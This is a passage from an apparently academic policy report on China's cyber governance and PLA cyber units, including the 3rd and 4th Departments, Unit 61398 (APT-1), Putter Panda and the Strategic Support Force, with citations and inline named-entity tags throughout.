Yahoo , [ORG] Microsoft and [ORG] Google , and calling for it to enhance [NORP] Chinese cyberspace , rather than patrol and intimidate internet users . See more at : \u2018 An Open Letter to [PERSON] Lu [PERSON] Wei and [ORG] the [ORG] Cyberspace [ORG] Administration of China.\u2019Greatfire.org . [CARDINAL] 26 [DATE] Jan. [DATE] 2015 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url [ORG] MIIT has , however , said that the core of the new regulations has been misunderstood , and they would not affect foreign companies launching services in [GPE] China or users accessing such websites.94 Despite the fact that the [ORDINAL] second reading of the draft regulations in [DATE] June [DATE] 2016 saw certain amendments , the existing draft further reaffirms the state \u2019s strict approach to controlling cyberspace and is soon expected to become adopted as law.95Each of these mentioned bodies has been trusted with specific tasks . While academia and specific institutions conduct research and strategic development work , it is the ministerial - level organisations which come up with policy initiatives and direct the required changes . Establishing [ORG] the [ORG] Central [ORG] Leading [ORG] Small [ORG] Group [ORG] for [ORG] Internet [ORG] Security [ORG] and [ORG] Informatisation and the [ORG] CAC as its executive body represents an additional step from the previously existing bureaucracy , as their authoritative leadership guarantees a better coordinated action between the ministries and bureaus . In terms of policy - making efficiency , it is a positive step towards a less fragmented system , but it also constitutes a part of President [PERSON] Xi \u2019s campaign to restrict anti - party and liberal movements through the opportunities the internet creates , which is demonstrated by the [ORG] CAC \u2019s predominantly restricting activities . The following sections will look more closely at [GPE] China \u2019s cyber security from the military \u2019s strategic and organisational perspective , which is intertwined with the goals and activities of the civilian agencies thus far discussed . While the militaries of the [GPE] US and [GPE] Russia have each published official documents on activities in cyberspace , the [ORG] PLA has not issued any specific doctrine . However , the concept of information has always been extremely important in [GPE] China \u2019s military strategies , and the contemporary emphasis on gathering information and intelligence is entirely in line with ancient [NORP] Chinese strategists such as [PERSON] Sun [PERSON] Zi . Therefore , it is essential to be aware of the guiding principles of the PLA \u2019s conducts before engaging in analysing the specific activities of its cyber units . The concept of information plays a central role in [NORP] Chinese military thinking . As cyberspace is strongly related to information , one can find relevant content within general military documents which explain the PLA \u2019s ambitions in cyberspace . For example , [LAW] the [LAW] Military [LAW] Strategic [LAW] Guidelines , normally renewed every [CARDINAL] 10 [CARDINAL] - [CARDINAL] 15 [CARDINAL] - [CARDINAL] years , lead defence and military policies strongly towards modernisation , while recognising the importance of the ability to fight in \u2018 technical conditions \u2019 and implying the significance of information technology in overall strategies.96 Furthermore , the recently updated [ORG] Science [ORG] of [ORG] Military [ORG] Strategy , a book issued by [ORG] the [ORG] Academy [ORG] of [ORG] Military [ORG] Sciences , the most important research institution of the [ORG] PLA , puts even stronger emphasis on conflict in the network domain and elaborates on developments of high - tech local war , giving guidelines on how to behave in such circumstances.97 In fact , its chapter on information warfare openly declares that [GPE] China does have specialised network warfare units , operating within both the military and the civilian spheres , and carrying out both offensive and defensive cyber operations.98Another initiative was launched in [DATE] October [DATE] 2014 when President [PERSON] Xi and [ORG] the [ORG] Central [ORG] Military [ORG] Commission issued a document entitled [WORK_OF_ART] Opinion [WORK_OF_ART] on [WORK_OF_ART] Further [WORK_OF_ART] Strengthening [WORK_OF_ART] Military [WORK_OF_ART] Information [WORK_OF_ART] Security [WORK_OF_ART] Work , which listed the basic principles and priorities for the [ORG] PLA , but also provided directives for the military in the information security [DATE] field.99 [DATE] 94 Chin , [PERSON] Josh . \u2018 [GPE] China Says New Internet Regulations Wo n't Increase Blocking of Foreign Websites . \u2019 [ORG] The [ORG] Wall [ORG] Street [ORG] Journal . [CARDINAL] 30 Mar. [DATE] 2016 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url of - foreign - websites-1459351655 > . [CARDINAL] 95 For a full draft of the proposed law on cybersecurity , see [ORG] Creemers , Rogier . \u2018 People 's [GPE] Republic [GPE] of [GPE] China Cybersecurity Law ( [ORDINAL] Second Reading Draft ) . \u2019 China Copyright and Media . [DATE] 6 [DATE] July [DATE] 2016 . Accessed [DATE] 18 [DATE] Aug. [DATE] 2016 . < url draft/ > . [CARDINAL] 96 [PERSON] Jiang , [PERSON] Zemin . \u2018 [PERSON] Guoji xingshi he junshi zhanl\u00fce fangzhe ( [PRODUCT] The [PRODUCT] Global [PRODUCT] Situation [PRODUCT] and [PRODUCT] Military [PRODUCT] Strategic [PRODUCT] Outline ) \u2019 in [PERSON] Jiang [PERSON] Zemin [PERSON] Wenxuan ( [PERSON] Jiang [PERSON] Zemin [PERSON] Anthology ) . [GPE] Beijing , [DATE] 2006 , cited in [GPE] Chang , [DATE] 2014 , p. [CARDINAL] 19 . [CARDINAL] 97 [PERSON] Chang , [DATE] 2014 , p. [CARDINAL] 25 . [CARDINAL] 98 Tiezzi , [FAC] Shannon . \u2018 [GPE] China ( Finally ) Admits to Hacking . \u2019 The Diplomat . [CARDINAL] 18 Mar. [DATE] 2015 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url 99 \u2018 Jing Xi Jinping zhuxi pizhun zhongyang junwei yinfa \u2018 guanyu jinyibu jiaqiang jundui xinxi anquan gongzuo de yijian ( Chairman of [ORG] the [ORG] Central [ORG] Military [ORG] Commission [PERSON] Xi [PERSON] Jinping approved the issuance of \u2018 Opinion on Further Strengthening Military Information19In [DATE] May [DATE] 2015 , [ORG] the [ORG] Chinese [ORG] Ministry [ORG] of [ORG] National [ORG] Defence issued [GPE] China \u2019s Military Strategy , also referred to as the [DATE] 2015 Defence White Paper , which places intense focus on the informatisation of warfare , and declares [GPE] China \u2019s intention to further develop cyber force and \u2018 enhance its capabilities of cyberspace situation awareness , cyber defence , support for the country \u2019s endeavours in cyberspace and participation in international cyber [PERSON] cooperation\u2019.100 [PERSON] Importantly , the document also reaffirms [GPE] China \u2019s goal to build an informationised military to be able to win future informationised wars.101China \u2019s ambition to achieve superiority in cyberspace is related to the belief that disabling the enemy \u2019s most valuable operation systems in the initial phases of a conflict would bring a quick victory . Looking at the available documents , it seems that [GPE] China is moving towards a common approach that incorporates cyber war with a kinetic attack.102 This also corresponds with the [NORP] Chinese strategists \u2019 hypothesis that informatisation creates a new battlefield which the PLA must master.103 However , there are also pragmatic economic and political objectives behind the military \u2019s cyber activities , mainly short and long - term gains from espionage against other governments and the private sector . Next to collecting valuable information from abroad , perhaps even more essential is the surveillance conducted against the [NORP] Chinese citizens in order to maintain control and political stability within the communist system . The main targets normally include political dissidents and democracy activists , but also [NORP] Tibetans , Uighurs and [PERSON] Falun [PERSON] Gong followers to examine their networks and communication methods.104 While these activities are not conducted only through military mechanisms , the paper will later show that the PLA \u2019s role is certainly vital in sustaining such operations . Interestingly , [GPE] China has always emphasised its defensive nature in every aspect of warfare , including information security . The [DATE] 2013 Defence White Paper proclaimed [GPE] China \u2019s right to protect its interests of national security and delivered a promise not to attack unless attacked [ORDINAL] first , including in cyberspace.105 Whereas several [NORP] Western countries have communicated a similar position , the [NORP] Chinese attitude relies on [PERSON] Mao Zedong \u2019s [PERSON] \u2018 active defence \u2019 as already emphasised in Document [CARDINAL] 27 in [DATE] 2003 , assuming to attack only after being attacked.106 Yet , Mao \u2019s \u2018 active defence \u2019 can also be interpreted as the alternative use of defensive and offensive . This , together with different strategic cultures , creates a situation where an act considered defensive by the [NORP] Chinese might seem offensive to the West.107 As an interesting parallel , \u2018 active cyber defence \u2019 is widely discussed in the [LOC] West , referring to the ability to detect and mitigate key threats before suffering from any damage , including the capacity to launch aggressive and offensive countermeasures.108 Thus , Western actions taken under the concept of \u2018 active cyber defence \u2019 might similarly seem offensive to the [NORP] Chinese . Connecting the [NORP] Chinese and the Western understandings of active defence , it seems that each has understood that in cyberspace , mere defensive capabilities are not enough to deter adversaries from attacking one \u2019s networks . As the [NORP] Chinese have recently admitted the existence of purely offensive cyber units in the [ORG] PLA , it is increasingly clear that conflict in cyberspace has achieved fundamental importance in the [NORP] Chinese understandings of policy making , both in peacetime , and in any future war.109Security Work \u2019 ) , \u2019 [PERSON] Jiefangjun bao ( PLA Daily ) , [DATE] 7 [DATE] Oct. [DATE] 2014 . < url 10/07 / c_1112726181.htm > , cited in [GPE] Chang , [DATE] 2014 , p. [CARDINAL] 19 . [CARDINAL] 100 \u2018 Document : [GPE] China 's Military Strategy . \u2019 [GPE] US Naval Institute News . [CARDINAL] 26 [DATE] May [DATE] 2015 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url 101 Ibid [CARDINAL] 102 Deal , [PERSON] Jacqueline [PERSON] N. [PERSON] \u2018 [NORP] Chinese [EVENT] Information [EVENT] War : [EVENT] Historical [EVENT] Analogies and Conceptual Debates , \u2019 pp . [CARDINAL] 18 [CARDINAL] - [CARDINAL] 22 in [GPE] Lindsay , [DATE] 2012 . [CARDINAL] 103 [PERSON] Peng [PERSON] Guangqian and Yao Youzhi eds . , \u2018 [LAW] Chapter [LAW] 20 : Rise of [ORG] the High [ORG] - Tech [ORG] Local [ORG] War and Its Historic Status , \u2019 in The Science of Military Strategy , [ORG] Academy [ORG] of [ORG] Military [ORG] Science [ORG] Strategic [ORG] Research [ORG] Department . [GPE] Beijing , [DATE] 2005 , cited in [GPE] Chang , [DATE] 2014 , p. [CARDINAL] 25 . 104 Feakin , [DATE] 2013 , p. [CARDINAL] 5 . [ORG] 105 [ORG] Information [ORG] Office [ORG] of [ORG] the [ORG] State [ORG] Council . [ORG] The [ORG] Diversified [ORG] Employment [ORG] of [ORG] China 's [ORG] Armed [ORG] Forces . Apr. 2013 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url [CARDINAL] 106 [GPE] Blasko , [DATE] 2014 , cited in [GPE] Chang , [DATE] 2014 , p. [CARDINAL] 20 . [CARDINAL] 107 [GPE] Chang , [DATE] 2014 , p. [CARDINAL] 25 . [CARDINAL] 108 [ORG] Dewar , [PERSON] Robert [PERSON] S. The \u2018 Triptych of Cyber Security \u2019 : A Classification of Active Cyber Defence . Proceedings of [ORDINAL] 6th [EVENT] International [EVENT] Conference [EVENT] on [EVENT] Cyber [EVENT] Conflict , [GPE] Tallinn . [DATE] 2014 , p. [CARDINAL] 10 . < url [CARDINAL] 109 For a detailed account on [NORP] Chinese thinking on cyber conflict , see [PERSON] Pollpeter , [PERSON] Kevin . \u2018 [LAW] Chapter [LAW] 6 : [NORP] Chinese Writings on [ORG] Cyberwarfare [ORG] and [ORG] Coercion , \u2019 in Lindsay et al . , [DATE] 2015.20In [DATE] 1986 , [GPE] China launched Programme [CARDINAL] 863 to catch up with the [LOC] West in key strategic industries through foreign intelligence collection , and to reduce its dependence on foreign technologies . The plan was intensified after [EVENT] the [EVENT] Gulf [EVENT] War in [DATE] 1991 , when the [ORG] PLA was stunned by the sophistication of [GPE] US weaponry.110 Relying on this imperative , the [NORP] Chinese military has implemented numerous reforms and modernisation plans , the latest and most comprehensive of them approved in [DATE] December [DATE] 2015 to adjust to [DATE] the [DATE] 21st century \u2019s cyber era and exploit its opportunities . Parts of the [NORP] Chinese military have become useful tools for the government to conduct political and economic cyber espionage , and also to help reduce the PLA \u2019s own technological and strategic disadvantages relative to its competitors . Prior to the largest restructuring within the [ORG] PLA \u2019s modernisation drive , [ORG] the [ORG] General [ORG] Staff [ORG] Department \u2019s [ORG] Communications [ORG] Department was restructured into [ORG] the [ORG] Informatisation [ORG] Department , together with establishing several smaller information - related departments in the [ORG] PLA regions and academia to raise the level of informatisation in the PLA.111 However , it seems that these developments should not receive too much attention in light of the reforms President [PERSON] Xi announced on [DATE] the [DATE] last [DATE] day [DATE] of [DATE] 2015 . [CARDINAL] Three new organs were introduced : [ORG] the [ORG] PLA [ORG] Rocket [ORG] Force , [ORG] the [ORG] PLA [ORG] Strategic [ORG] Support [ORG] Force , and the [ORG] Army Leadership Organ . Importantly , [ORG] the [ORG] Rocket [ORG] Force assumed the responsibilities of [ORG] the [ORG] PLA [ORG] Second [ORG] Artillery [ORG] Force and earned promotion to a status equal to [ORG] the [ORG] PLA [ORG] Army , [ORG] Navy and [ORG] Air [ORG] Force . By [DATE] today , it appears that [ORG] the [ORG] Strategic [ORG] Support [ORG] Force ( SSF ) has also been given a status equal to these professional service branches , and will likely formulate the core of [GPE] China \u2019s information warfare effort by comprising forces in the space , cyber and electromagnetic domains , thus finally bringing [GPE] China \u2019s military - related informatisation activities under [CARDINAL] one umbrella.112However , the reforms are currently being implemented and the date of actual completion remains unknown.113 So far , [CARDINAL] two ( former ) executive bodies of [ORG] the [ORG] PLA \u2019s [ORG] General [ORG] Staff [ORG] Department ( [ORG] GSD ): the [ORDINAL] 3rd and the [ORDINAL] 4th Departments , have been trusted with cyber intelligence and cyber - warfare respectively . Even though both departments will most likely become integrated under the [ORG] SSF , their successors \u2019 corresponding goals and practices are expected to remain similar , and therefore , it is appropriate to introduce these institutions in more detail . Before giving full attention to [ORG] the [ORG] 3rd [ORG] Department ( 3 / PLA ) , sometimes also referred to as [ORG] the [ORG] Technical [ORG] Department , it is necessary to recall that the [ORG] MSS carries similar intelligence responsibilities in the civilian side . Also , [ORG] the [ORG] General [ORG] Staff [ORG] Department \u2019s [ORG] 2nd [ORG] Department ( 2 / PLA ) is considered the conventional intelligence gathering agency and is involved with collecting and analysing mainly open - source information through its global network of defence attach\u00e9s . Whereas it is not regularly engaged with covert operations , its non - official cover officers are believed to have had significant success in collecting valuable data about [GPE] US and other Western weapon systems . [CARDINAL] 114 Nevertheless , neither [ORG] MSS nor [CARDINAL] 2 / PLA have played as significant role in cyber intelligence as [ORG] 3 / PLA.According to [PERSON] Nigel [PERSON] Inkster , [CARDINAL] 3 / PLA has so far been the main operational force of the PLA \u2019s cyber activities , as almost all operations that have been tracked originate from its official premises.115 Appearing to be a counterpart to [ORG] the [ORG] National [ORG] Security [ORG] Agency in the [GPE] US , [CARDINAL] 3 / PLA \u2019s main focus has been on collecting signals intelligence ( SIGINT ) . Before the internet \u2019s surge , it operated as a conventional SIGINT agency , but did not possess known overseas collection110 [GPE] Inkster , [PERSON] Nigel . \u2018 [NORP] Chinese Intelligence in the Cyber Age . \u2019 Survival : Global Politics and Strategy Vol 55(1 ) ( [DATE] 2013 ): [CARDINAL] 45 - 66 , p. [CARDINAL] 50 . < url [DATE] 2013 [DATE] - 3db7/55 - 1 - 05 - inkster-936c > . [CARDINAL] 111 Thomas , [PERSON] Timothy [PERSON] L. [PERSON] Three Faces of the Cyber Dragon . [ORG] Foreign [ORG] Military [ORG] Studies [ORG] Office , [DATE] 2012 , pp . 69 [DATE] - [DATE] 72 . [CARDINAL] 112 Costello , John . \u2018 [WORK_OF_ART] The [WORK_OF_ART] Strategic [WORK_OF_ART] Support [WORK_OF_ART] Force : [GPE] China 's [ORG] Information [ORG] Warfare [ORG] Service . \u2019 [ORG] The [ORG] Jamestown [ORG] Foundation . [DATE] 8 [DATE] Feb. [DATE] 2016 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url 68e96736b6cb#.V6RA_Lt95aQ > . [CARDINAL] 113 It might be assumed that the [ORG] PLA targets to complete the reforms by [DATE] around [DATE] 2020 . [CARDINAL] 114 Inkster , [DATE] 2013 , p. [CARDINAL] 49 . [CARDINAL] 115 Inkster , [PERSON] Nigel . \u2018 [NORP] Chinese [ORG] Intelligence [ORG] Operations [ORG] and [ORG] Transnational [ORG] Consequences , \u2019 p. [CARDINAL] 24 in [GPE] Lindsay , 2012.21capabilities matching those of the [NORP] Americans or the British.116 More recently , its role has been narrowed to cyber network exploitation ( [ORG] CNE ) or espionage , and despite its presence in scandalous news stories quite often , [CARDINAL] 3 / PLA has proven to be a highly beneficial component of [GPE] China \u2019s military . At the same time , it has managed to remain rather mysterious about its interactions with other domestic intelligence units , including the [ORG] MSS , leaving open the question of how efficient the coordination and information sharing among the domestic bodies is . Nevertheless , looking at [ORG] 3 / [ORG] PLA \u2019s wide - ranging structure , traditional competence in SIGINT , its high performance in computing and cryptology , and its status as [GPE] China \u2019s largest employer of professional linguists , one may assume its respective importance , or even a central role among other institutions.117 However , with the announced creation of the [ORG] SSF , it is likely that [GPE] China \u2019s strategic intelligence and informatisation units will be merged into [CARDINAL] one central intelligence structure , leaving open the question of in what form 3 / PLA will continue , if at all.3 / [ORG] PLA \u2019s headquarters is in [GPE] Beijing , where it runs political and logistics departments together with [ORG] the [ORG] Science [ORG] and [ORG] Technology [ORG] Intelligence [ORG] Bureau and [ORG] the [ORG] Science [ORG] and [ORG] Technology [ORG] Equipment [ORG] Bureau , which commands [CARDINAL] three research institutes responsible for computing , sensor technology and cryptography , respectively named [DATE] the 56th , [DATE] 57th and 58th Research Institutes . In addition , [CARDINAL] 3 / PLA manages or is affiliated with several [ORG] Computer [ORG] Network Defence- related institutions such as [ORG] the [ORG] National [ORG] Research [ORG] Centre [ORG] for [ORG] Information [ORG] Security [ORG] Technology , [ORG] the [ORG] Information [ORG] Security [ORG] Research [ORG] Institute , and [ORG] the [ORG] PLA [ORG] Communications [ORG] Security Bureau.118 Next to these bodies , it is the [CARDINAL] 12 operational bureaus that play the most important role in [CARDINAL] 3 / PLA \u2019s structure . Each of the bureaus usually carries out a specific task , for example intercepting radio or satellite communications , conducting cryptology , translation , or intelligence analysis on diplomatic communications , foreign militaries , economic entities , educational institutions , and individuals considered worthy of surveillance.119The 2nd and 12th Bureaus deserve further attention.120 [ORDINAL] First , the [GPE] Shanghai headquartered [ORG] 2nd [ORG] Bureau , also known as Unit 61398 by its Military Unit Cover Designator , seems to specifically target the [GPE] US and [GPE] Canada to obtain political , economic , and military intelligence . It was exposed in [DATE] February [DATE] 2013 , when [ORG] Mandiant published an unprecedentedly thorough report on a unit they named APT-1 , which has achieved public attention through its very similar missions , capabilities , resources and location to the [ORDINAL] 2nd Bureau . After having observed APT-1 \u2019s long - term and extensive cyber espionage operations for [DATE] several [DATE] years , [ORG] Mandiant concluded that APT-1 is most likely government - funded and one of the most prolific and dangerous of [GPE] China \u2019s cyber actors.121 According to the size of its physical infrastructure , [PERSON] APT- [PERSON] 1 is staffed by [CARDINAL] at [CARDINAL] least [CARDINAL] hundreds , if not [CARDINAL] thousands of people , all required to be competent in computer network operations and English.122 Indeed , as [ORG] Mandiant notes , [PERCENT] 87 % of APT-1 \u2019s victims are in [LANGUAGE] English - speaking countries and belong to industries that [GPE] China has said to carry strategic importance to national growth . With the apparent help of recruited linguists , malware authors and industry experts , APT-1 had by the time of the report \u2019s publication obtained [CARDINAL] hundreds of terabytes of data from [CARDINAL] at [CARDINAL] least [CARDINAL] 141 organisations over 20 industries.123116 [GPE] Inkster , [DATE] 2013 , p. [CARDINAL] 49 . [CARDINAL] 117 Stokes , [PERSON] Mark [PERSON] A. , [PERSON] Jenny [PERSON] Lin , and [PERSON] Russell [PERSON] Hsiao . [ORG] The [ORG] Chinese People \u2019s [ORG] Liberation [ORG] Army [ORG] Signals [ORG] Intelligence [ORG] and [ORG] Cyber [ORG] Reconnaissance [ORG] Infrastructure . Report by [ORG] Project [ORG] 2049 [ORG] Institute , [DATE] 2011 , p. [CARDINAL] 3 . < url [CARDINAL] 118 Stokes et al . , [DATE] 2011 , pp . [DATE] 4 [DATE] - [DATE] 5 . [CARDINAL] 119 Stokes et al . , [DATE] 2011 , p. [CARDINAL] 7 . [CARDINAL] 120 For an overview of all [CARDINAL] 12 bureaus , see [PERSON] Stokes , [PERSON] Mark [PERSON] A. [PERSON] \u2018 [LAW] Chapter [LAW] 7 : [ORG] The [ORG] Chinese People \u2019s [ORG] Liberation [ORG] Army [ORG] Computer [ORG] Network [ORG] Operations [ORG] Infrastructure , \u2019 p. [CARDINAL] 169 in [GPE] Lindsay et al . , [DATE] 2015 . [CARDINAL] 121 APT1 : Exposing [CARDINAL] One of China \u2019s Cyber Espionage Units . Report by [ORG] Mandiant , [DATE] 2013 , p. [CARDINAL] 2 . < url [CARDINAL] 122 The [CARDINAL] five [ORG] PLA officers that the [GPE] US indicted in [DATE] 2014 [DATE] summer were also working for Unit 61398 . For a detailed overview of the [ORDINAL] 2nd Bureau , see [PERSON] Stokes , [PERSON] Mark [PERSON] A. The PLA General Staff Department [ORG] Third [ORG] Department [ORG] Second [ORG] Bureau . Report by [ORG] Project [ORG] 2049 [ORG] Institute , [DATE] 2015 . < url [CARDINAL] 123 APT-1 has demonstrated the ability to establish its presence on the victim \u2019s network and revisit it over [DATE] several [DATE] years ( the longest recognised period exceeding [DATE] four [DATE] years ) to access the victim \u2019s intellectual property , business plans , technology blueprints , etc . See more at APT-1 , [DATE] 2013 , p. [CARDINAL] 3 - 5 . The [NORP] Chinese side has called the [ORG] Mandiant \u2019s report \u2018 amateurish \u2019 and argued it is technologically highly unlikely to track the origin of specified attacks . See more at \u2018 [NORP] Chinese Media Slam [ORG] Cyber [ORG] - [ORG] Hacking [ORG] Report . \u2019 [ORG] VOA . [DATE] 21 [DATE] Feb. [DATE] 2013 . Accessed [DATE] 24 [DATE] Aug. [DATE] 2016 . < url report/1607835.html>.22A year after the [ORG] Mandiant \u2019s report , a threat intelligence firm [ORG] CrowdStrike disclosed another unit of [CARDINAL] 3 / PLA . Namely , the [ORDINAL] 12th [GPE] Bureau , or Unit 61486 , also headquartered in [GPE] Shanghai is believed to support [GPE] China \u2019s space surveillance network and tasked to intercept satellite communications and collect space - based SIGINT.124 According to the [ORG] CrowdStrike report , the group , also called [PERSON] Putter [PERSON] Panda , has been active since [DATE] 2007 , allegedly targeting the aerospace industries in both [LOC] Europe and the [GPE] US through attacks on the government , defence , research and technology sectors . The group \u2019s methodology relies on deploying malware through targeted emails in the form of spear phishing.125 The uncovering of the [ORDINAL] 12th Bureau shows that [GPE] China can use cyber espionage on [CARDINAL] two strategic levels : illegally obtained intellectual property allows it to speed up its own space - related developments , but also enables exploitation of an opponent \u2019s satellite weaknesses during a real conflict.126Evidently , collecting foreign intelligence through cyber espionage has been fully institutionalised and prioritised for [CARDINAL] 3 / PLA . However , [CARDINAL] 3 / PLA \u2019s operations are often in parallel with those of [ORG] the [ORG] Military [ORG] Region [ORG] Technical [ORG] Reconnaissance [ORG] Bureaus ( TRB ) , which operate under [CARDINAL] seven military regions and are independent of [CARDINAL] 3 / PLA . Like 3 / PLA , the TRBs \u2019 responsibilities include computer network exploitation , but also cryptology and communications intelligence.127 Next to the military region TRBs , the [ORG] PLA runs Service TRBs which intercept communications in areas related to their interests , such as the air force or the navy.128Even though [ORG] the [ORG] 4th [ORG] Department ( 4 / PLA ) has received less attention than 3 / PLA , it ( or its respective future successor under the SSF ) is expected to fall under greater scrutiny due to the revelation of the existing network attack forces in the [DATE] 2015 edition of [WORK_OF_ART] The [WORK_OF_ART] Science [WORK_OF_ART] of [WORK_OF_ART] Military Strategy.129 Formerly known as [ORG] the [ORG] Electronic [ORG] Countermeasures [ORG] Department , [CARDINAL] 4 / PLA is the institution one should become familiar with when seeking to prepare for the increasingly hyped danger of cyber war . Hierarchically the equal of [CARDINAL] 3 / PLA , [CARDINAL] 4 / PLA was traditionally responsible for electronic warfare , but has recently also assumed the task of carrying out computer network attacks ( [ORG] CNA)130 as a result of the PLA \u2019s adoption of an offensive information warfare doctrine , [ORG] the [ORG] Integrated [ORG] Network [ORG] Electronic [ORG] Warfare ( INEW ) , which is an \u2018 organic combination of electronic warfare and computer network warfare \u2019 , as explained by General [PERSON] Dai [PERSON] Qingmin , former Commander of [ORG] 4 / PLA.131 Therefore , unlike [CARDINAL] 3 / PLA , this department \u2019s mission is offensive , rather than defensive electronic warfare or pure intelligence collection and analysis.132 The simplest offensive activities could be denial - of - service attacks to disrupt services or the use of worms or [ORG] Trojan [ORG] Horses to obtain sensitive data . [CARDINAL] 4 / PLA can also engage in collecting electronic intelligence and providing tactical electronic support measures.133 Furthermore , it manages electronic countermeasures ( [ORG] ECM ) units , which have obtained increasing coverage in the [ORG] PLA media due to the increasing interconnection between information and electronic - based missions [PERSON] and124 [PERSON] Stokes et al . , [DATE] 2011 , p. [CARDINAL] 11 . [CARDINAL] 125 See more at [ORG] CrowdStrike [ORG] Intelligence [ORG] Report : Putter Panda . Report by [ORG] CrowdStrike , [DATE] 2014 . < url cdn.com/assets/4589853/crowdstrike-intelligence-report-putter-panda.original.pdf > . [CARDINAL] 126 [PERSON] Cheng , [PERSON] Joey . \u2018 Cyber Conflict Escalates : [ORDINAL] Second [NORP] Chinese [ORG] PLA [ORG] Hacking [ORG] Group [ORG] Accused . \u2019 Defense Systems . [DATE] 10 [DATE] June [DATE] 2014 . Accessed [DATE] 24 [DATE] Aug. [DATE] 2016 . < url 127 Stokes et al . , [DATE] 2011 , p. [CARDINAL] 12 . [CARDINAL] 128 Stokes , [PERSON] Mark . \u2018 People \u2019s [ORG] Liberation [ORG] Army [ORG] Infrastructure [ORG] for [ORG] Cyber [ORG] Reconnaissance , \u2019 p. [CARDINAL] 23 in [GPE] Lindsay , [DATE] 2012 . [CARDINAL] 129 Indeed , even though analysts consider the newly confirmed fact rather a self - promotion and sensationalism without conveying anything substantially new , it does make other countries even more cautious when it comes to cooperating with [GPE] China in any cyber - related developments . See more at [GPE] Tiezzi , [DATE] 2015 . [CARDINAL] 130 Krekel , Bryan , [PERSON] Patton [PERSON] Adams , and [PERSON] George [PERSON] Bakos . Occupying the Information High Ground : Chinese Capabilities for [ORG] Computer [ORG] Network [ORG] Operations and [WORK_OF_ART] Cyber [WORK_OF_ART] Espionage . Report by [PERSON] Northrop [PERSON] Grumman , [DATE] 2012 , p. [CARDINAL] 44 . < url ons_and_Cyber_%20Espionage.pdf > . [CARDINAL] 131 Lu [GPE] Daohai , [ORG] Information [ORG] Operations . [ORG] PLA [ORG] Arts and [ORG] Literature [ORG] Press , [DATE] 1999 , p. [CARDINAL] 324 , cited in [GPE] Mulvenon , James . \u2018 Chapter [CARDINAL] 8 : [ORG] PLA [ORG] Computer [ORG] Network [ORG] Operations : Scenarios , Doctrine , Organizations , and Capability , \u2019 in [PERSON] Kamphausen , [PERSON] Roy , [PERSON] David [PERSON] Lai , and [PERSON] Andrew [PERSON] Scobell ( eds . ) Beyond the Strait : PLA Missions other than [GPE] Taiwan , [ORG] Strategic [ORG] Studies [ORG] Institute , [DATE] 2009 , p. [CARDINAL] 260 . [CARDINAL] 132 Krekel et al . , [DATE] 2012 , p. [CARDINAL] 47 . [CARDINAL] 133 [GPE] Inkster , [DATE] 2013 , p. [CARDINAL] 49.23conventional army elements during military exercises.134Importantly , [CARDINAL] 4 / PLA is also responsible for managing a number of research institutions related to developing new [ORG] ECM . Apparently , the most notable of these is [ORG] the [ORG] 54th [ORG] Research [ORG] Institute , which provides engineering support and facilitates the department \u2019s connection with other entities under [ORG] the [ORG] China [ORG] Electronic [ORG] Technology [ORG] Corporation . For training junior officers , [CARDINAL] 4 / PLA runs [ORG] the [ORG] PLA [ORG] Electronic [ORG] Engineering [ORG] Academy located in [GPE] Hefei as the primary academic electronic warfare centre in China.135 Interestingly , and again deriving from the [NORP] Chinese historic understanding of information as the key to victory , several of the research institutes under 4 / PLA have focused on how to counter key [NORP] American [PRODUCT] C4ISR systems . Some of the methods include , for example GPS jamming , [ORG] Joint [ORG] Tactical [ORG] Information [ORG] Distribution [ORG] System countermeasures , and synthetic radar jamming . Such electronic warfare capabilities would be coordinated with [ORG] CNA tools to conduct a complete attack against the enemy \u2019s key command and networks.136Regarding the interaction between the 3 / PLA and 4 / PLA , it is likely that some of their duties , such as R&D , intelligence collection , or managing a joint network warfare training system overlap.137 However , the offensive nature of [CARDINAL] 4 / PLA \u2019s operations distinguishes it from [CARDINAL] 3 / PLA and has thereby made it a centre of discussion on cyber warfare . Yet , [CARDINAL] 3 / PLA has undeniably been more attractive to foreign researchers due to its enduring cyber espionage activities , which are currently more tangible than actual cyber war . What might indicate the next possible targets of the [ORG] PLA cyber units is [GPE] China \u2019s [ORDINAL] thirteenth [DATE] five [DATE] - [DATE] year plan introduced in [DATE] October [DATE] 2015 , which outlines the industries in which [GPE] China aims to achieve the most growth . Therefore , other than the defence sector , developers of clean energy , electric cars , computer chips as well as healthcare should implement greater security in their online operations.138However , it is important to bear in mind that the overall \u2018 [NORP] Chinese cyber threat \u2019 is often exemplified and not placed into proper context , especially by the [NORP] Americans . While not justifying [GPE] China \u2019s actions , [PERSON] Greg [PERSON] Austin , a well - regarded [GPE] China expert , draws attention to factors such as commercial lobbying and attention seeking by [NORP] American cyber security firms , a media environment too receptive to cyberspace intrigues and anti [NORP] - [NORP] China rhetoric , and the general lack of knowledge even among the highest decision - makers on the details and conduct of the [GPE] US \u2019s own cyber espionage and operations against China.139The establishment of [ORG] the [ORG] Strategic [ORG] Support [ORG] Force ( SSF ) was somewhat unexpected for foreign observers , but it is actually a logical step within the general modernisation of the [ORG] PLA . For example , the launch of [ORG] the [ORG] PLA \u2019s Cyberspace Strategic Intelligence Research Centre in [DATE] June [DATE] 2014 to \u2018 provide strong support in obtaining high - quality intelligence research findings and help [GPE] China gain advantage in national information security \u2019 already led observers to conclude that the PLA \u2019s focus was increasingly falling on cyberspace.140 Indeed , as it seems that information warfare has become central to [GPE] China \u2019s \u2018 active defence \u2019 strategic concept , the [ORG] SSF will likely become the main force behind its execution , acting as a culmination of [DATE] years of technological advancement and institutional change.141 Moreover , as the [ORG] SSF will assume control over the PLA \u2019s space and cyber operations , it will cover [CARDINAL] two aspects of [GPE] China \u2019s new134 Easton , [PERSON] Ian , and [PERSON] Mark [PERSON] A. [PERSON] Stokes . [ORG] China \u2019s [ORG] Electronic [ORG] Intelligence [ORG] Satellite [ORG] Developments . Report by [ORG] Project [ORG] 2049 [ORG] Institute , [DATE] 2011 , p .5 . < url [CARDINAL] 135 Krekel et al . , [DATE] 2012 , p. [CARDINAL] 47 . [CARDINAL] 136 Ibid , p. [CARDINAL] 48 . [CARDINAL] 137 Stokes et al . , [DATE] 2011 , p. [CARDINAL] 15 . [CARDINAL] 138 [ORG] CrowdStrike has mapped the groups potentially targeting particular industries according to their previously observed 